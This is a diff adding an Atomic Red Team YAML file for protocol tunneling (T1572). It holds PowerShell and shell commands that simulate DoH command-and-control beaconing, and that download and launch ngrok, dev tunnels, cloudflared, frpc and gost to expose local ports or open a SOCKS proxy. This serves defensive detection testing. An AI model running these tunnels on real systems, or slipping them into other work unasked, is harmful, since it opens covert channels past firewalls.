@@ -1,0 +1,400 @@
+attack_technique: T1572
+display_name: 'Protocol Tunneling'
+atomic_tests:
+- name: DNS over HTTPS Large Query Volume
+  auto_generated_guid: ae9ef4b0-d8c1-49d4-8758-06206f19af0a
+  description: |
+    This test simulates an infected host sending a large volume of DoH queries to a command and control server.
+    The intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.
+    A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+  supported_platforms:
+  - windows
+  input_arguments:
+    doh_server:
+      description: Default DoH resolver
+      type: string
+      default: https://8.8.8.8/resolve
+    query_type:
+      description: DNS query type
+      type: string
+      default: TXT
+    subdomain:
+      description: Subdomain prepended to the domain name
+      type: string
+      default: atomicredteam
+    query_volume:
+      description: Number of DNS queries to send
+      type: integer
+      default: 1000
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: 127.0.0.1.xip.io
+  executor:
+    command: |
+      for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }
+    name: powershell
+- name: DNS over HTTPS Regular Beaconing
+  auto_generated_guid: 0c5f9705-c575-42a6-9609-cbbff4b2fc9b
+  description: |
+    This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.
+    This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
+    A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+  supported_platforms:
+  - windows
+  input_arguments:
+    doh_server:
+      description: Default DoH resolver
+      type: string
+      default: https://8.8.8.8/resolve
+    runtime:
+      description: Time in minutes to run the simulation
+      type: integer
+      default: 30
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: 127.0.0.1.xip.io
+    subdomain:
+      description: Subdomain prepended to the domain name
+      type: string
+      default: atomicredteam
+    query_type:
+      description: DNS query type
+      type: string
+      default: TXT
+    c2_interval:
+      description: Seconds between C2 requests to the command and control server
+      type: integer
+      default: 30
+    c2_jitter:
+      description: Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests
+      type: integer
+      default: 20
+  executor:
+    command: |
+      Set-Location "PathToAtomicsFolder"
+      .\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
+    name: powershell
+- name: DNS over HTTPS Long Domain Query
+  auto_generated_guid: 748a73d5-cea4-4f34-84d8-839da5baa99c
+  description: |
+    This test simulates an infected host returning data to a command and control server using long domain names.
+    The simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.
+     Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+  supported_platforms:
+  - windows
+  input_arguments:
+    doh_server:
+      description: Default DoH resolver
+      type: string
+      default: https://8.8.8.8/resolve
+    query_type:
+      description: DNS query type
+      type: string
+      default: TXT
+    subdomain:
+      description: Subdomain prepended to the domain name (should be 63 characters to test maximum length)
+      type: string
+      default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: 127.0.0.1.xip.io
+  executor:
+    command: |
+      Set-Location "PathToAtomicsFolder"
+      .\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+    name: powershell
+- name: run ngrok
+  auto_generated_guid: 4cdc9fc7-53fb-4894-9f0c-64836943ea60
+  description: |
+    Download and run ngrok. Create tunnel to chosen port.
+
+  supported_platforms:
+  - windows
+  input_arguments:
+    api_token:
+      description: ngrok API
+      type: string
+      default: N/A
+    port_num:
+      description: port number for tunnel
+      type: integer
+      default: 3389
+    download:
+      description: link to download ngrok
+      type: string
+      default: https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Download ngrok
+    prereq_command: |
+      if (Test-Path C:\Users\Public\ngrok) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Path C:\Users\Public\ngrok -ItemType Directory | Out-Null
+      Invoke-WebRequest #{download} -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip
+      Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\Users\Public\ngrok
+  executor:
+    command: |
+      C:\Users\Public\ngrok\ngrok.exe config add-authtoken #{api_token} | Out-Null
+      Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp #{port_num} } | Out-Null
+      Start-Sleep -s 5 
+      Stop-Job -Name Job1 | Out-Null
+    cleanup_command: |
+      Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
+      Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+
+- name: Microsoft Dev tunnels (Linux/macOS)
+  auto_generated_guid: 9f94a112-1ce2-464d-a63b-83c1f465f801
+  description: |
+    Dev Tunnels enables insiders as well as threat actors to expose local ports over the internet via Microsoft dev tunnels.
+
+    This atomic will generate a dev tunnel binding it to the local service running on the provided port. Can be used to expose local services, web applications and local files etc.
+    Reference:
+    - [Microsoft Docs](https://learn.microsoft.com/en-us/tunnels/dev-tunnels-overview)
+    - [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/devtunnels/)
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    port:
+      description: port number for tunnel
+      type: integer
+      default: 8080
+    download_url:
+      description: link to download devtunnel
+      type: string
+      default: https://aka.ms/TunnelsCliDownload/linux-x64
+    binary_path:
+      description: path to download devtunnel
+      type: string
+      default: PathToAtomicsFolder/../ExternalPayloads/devtunnel
+  dependencies:
+  - description: |
+      Download devtunnel
+    prereq_command: |
+      test -f #{binary_path}
+    get_prereq_command: |
+      mkdir -p $(dirname #{binary_path})
+      curl -L "#{download_url}" -o "#{binary_path}"
+      chmod +x #{binary_path}
+  - description: |
+      Login to Microsoft Dev tunnels
+    prereq_command: |
+      #{binary_path} user show | grep -q "Not logged in" && exit 1 || exit 0
+    get_prereq_command: |
+      echo "Login to devtunnel using the following command: #{binary_path} user login"
+  executor:
+    command: |
+      #{binary_path} host -p #{port} &
+    cleanup_command: |
+      pkill -9 $(basename "#{binary_path}")
+      #{binary_path} user logout
+      rm #{binary_path}
+    name: bash
+
+- name: VSCode tunnels (Linux/macOS)
+  auto_generated_guid: b877943f-0377-44f4-8477-f79db7f07c4d
+  description: |
+    Visual Studio Code Remote Tunnels can be used for exposing local development environment/services/files over the internet.
+    This atomic will generate a dev tunnel binding it to the local service running on the provided port.
+    Reference:
+    - [Microsoft Docs](https://code.visualstudio.com/docs/remote/tunnels)
+    - [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/vscode-server/)
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    artifact_base_url:
+      description: Base URL to download code-cli
+      type: string
+      default: https://code.visualstudio.com/sha/download
+    artifact_build:
+      description: build to download - Allowed values (stable/insiders)
+      type: string
+      default: stable
+    payload_path:
+      description: path to download code-cli
+      type: string
+      default: PathToAtomicsFolder/../ExternalPayloads
+    additional_args:
+      description: additional arguments to pass to code tunnel
+      type: string
+      default: ""
+  dependencies:
+  - description: |
+      Install code-cli
+    prereq_command: |
+      which code
+    get_prereq_command: |
+      ARCH_SUFFIX=$(uname -m | grep -q "arm64\|aarch64" && echo "arm64" || echo "x64")
+      if [ "$(uname)" = "Darwin" ]
+      then brew install code-cli
+      elif [ "$(expr substr $(uname) 1 5)" = "Linux" ]
+      then mkdir -p $(dirname #{payload_path})        
+        PKG_TYPE=$(command -v apt >/dev/null && echo "deb" || echo "rpm")
+        curl -L "#{artifact_base_url}?build=#{artifact_build}&os=linux-${PKG_TYPE}-${ARCH_SUFFIX}" -o "#{payload_path}/code.${PKG_TYPE}"
+        (which apt && apt install -y "#{payload_path}/code.${PKG_TYPE}") || (which yum && yum install -y "#{payload_path}/code.${PKG_TYPE}")
+        rm "#{payload_path}/code.${PKG_TYPE}"
+      fi
+  - description: |
+      Login to VSCode Dev tunnels
+    prereq_command: |
+      code tunnel user show | grep -q "not logged in" && exit 1 || exit 0
+    get_prereq_command: |
+      echo "Login to code tunnel using the following command: code tunnel user login"
+  executor:
+    command: |
+      nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &
+    cleanup_command: |
+      pkill -9 tunnel
+      code tunnel unregister
+      code tunnel user logout
+    name: sh
+
+- name: Cloudflare tunnels (Linux/macOS)
+  auto_generated_guid: 228c336a-2f79-4043-8aef-bfa453a611d5
+  description: |
+    Cloudflared can be used for exposing local development environment/services/files over the internet.
+    This atomic will generate a dev tunnel binding it to the local service running on the provided port.
+    Reference:
+    - [Cloudflared Docs](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/)
+    - [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/cloudflared/)
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    cloudflared_artifact_base_url:
+      description: Base URL to download cloudflared
+      type: string
+      default: https://github.com/cloudflare/cloudflared/releases/latest/download
+    binary_path:
+      description: path to download cloudflared
+      type: string
+      default: PathToAtomicsFolder/../ExternalPayloads/cloudflared
+    url_to_tunnel:
+      description: IP and port to expose
+      type: string
+      default: localhost:8080
+    additional_args:
+      description: Additional arguments to pass to cloudflared
+      type: string
+      default: ""
+  dependencies:
+  - description: |
+      Download cloudflared
+    prereq_command: |
+      test -f "#{binary_path}" && exit 0 || exit 1
+    get_prereq_command: |
+      ARCH_SUFFIX=$(uname -m | grep -q "arm64\|aarch64" && echo "arm64" || echo "amd64")
+      if [ "$(uname)" = "Darwin" ]
+      then curl -L "#{cloudflared_artifact_base_url}/cloudflared-darwin-${ARCH_SUFFIX}.tgz" -o "$(dirname #{binary_path})/cloudflared-darwin-${ARCH_SUFFIX}.tgz" 
+        cd "$(dirname #{binary_path})"
+        tar -xzf "cloudflared-darwin-${ARCH_SUFFIX}.tgz"
+        rm -f "cloudflared-darwin-${ARCH_SUFFIX}.tgz"
+        chmod +x "#{binary_path}"
+      elif [ "$(expr substr $(uname) 1 5)" = "Linux" ]
+      then mkdir -p $(dirname #{binary_path})
+        curl -L "#{cloudflared_artifact_base_url}/cloudflared-linux-${ARCH_SUFFIX}" -o "#{binary_path}"
+        chmod +x "#{binary_path}"
+      fi
+  executor:
+    command: |
+      nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &
+    cleanup_command: |
+      pkill -9 $(basename "#{binary_path}")
+      rm -f "#{binary_path}"
+    name: sh
+- name: Install and Run frpc Reverse Proxy Client
+  auto_generated_guid: f54179ee-c782-4fe3-b836-213d3bda66a2
+  description: |
+    Downloads and runs frpc (fast reverse proxy client), the victim-side component
+    of the frp framework. Adversaries deploy frpc on compromised hosts to establish
+    outbound tunnel connections to an attacker-controlled frps server, bypassing
+    inbound firewall rules and exposing internal services externally.
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: URL to download the frp release archive
+      type: url
+      default: https://github.com/fatedier/frp/releases/download/v0.71.0/frp_0.71.0_linux_amd64.tar.gz
+    frp_path:
+      description: Path to extract the frp archive
+      type: path
+      default: PathToAtomicsFolder/../ExternalPayloads/frp
+    server_addr:
+      description: Address of the frps server to connect to
+      type: string
+      default: 127.0.0.1
+    server_port:
+      description: Port of the frps server to connect to
+      type: integer
+      default: 7000
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      frpc binary must exist at #{frp_path}/frpc
+    prereq_command: |
+      test -f #{frp_path}/frpc
+    get_prereq_command: |
+      mkdir -p #{frp_path}
+      curl -L "#{remote_url}" -o "#{frp_path}/frp.tar.gz"
+      tar -xzf "#{frp_path}/frp.tar.gz" --strip-components 1 -C "#{frp_path}"
+      rm -f "#{frp_path}/frp.tar.gz"
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      sed -i "s/^serverAddr = .*/serverAddr = \"#{server_addr}\"/" #{frp_path}/frpc.toml
+      sed -i "s/^serverPort = .*/serverPort = #{server_port}/" #{frp_path}/frpc.toml
+      nohup #{frp_path}/frpc -c #{frp_path}/frpc.toml >/dev/null 2>&1 &
+    cleanup_command: |
+      pkill frpc
+      rm -rf #{frp_path}
+- name: Install and Run gost Tunnel Proxy
+  auto_generated_guid: 3afc90c4-90b3-44af-8d14-52852abe7258
+  description: |
+    Downloads and runs gost (Go Simple Tunnel), a multi-protocol proxy and tunnel
+    tool used by adversaries to establish SOCKS5 proxies, protocol relays, and
+    encrypted tunnels on compromised hosts to facilitate C2 communication and
+    lateral movement while evading network controls.
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: URL to download the gost release archive
+      type: url
+      default: https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz
+    gost_path:
+      description: Path to store the gost binary
+      type: path
+      default: PathToAtomicsFolder/../ExternalPayloads/gost
+    listen_port:
+      description: Local port for the SOCKS5 proxy listener
+      type: integer
+      default: 1080
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      gost binary must exist at #{gost_path}/gost
+    prereq_command: |
+      test -f #{gost_path}/gost
+    get_prereq_command: |
+      mkdir -p #{gost_path}
+      curl -L "#{remote_url}" -o "#{gost_path}/gost.tar.gz"
+      tar -xzf "#{gost_path}/gost.tar.gz" -C "#{gost_path}"
+      rm -f "#{gost_path}/gost.tar.gz"
+      chmod +x #{gost_path}/gost
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      nohup #{gost_path}/gost -L socks5://:#{listen_port} >/dev/null 2>&1 &
+    cleanup_command: |
+      pkill gost
+      rm -rf #{gost_path}
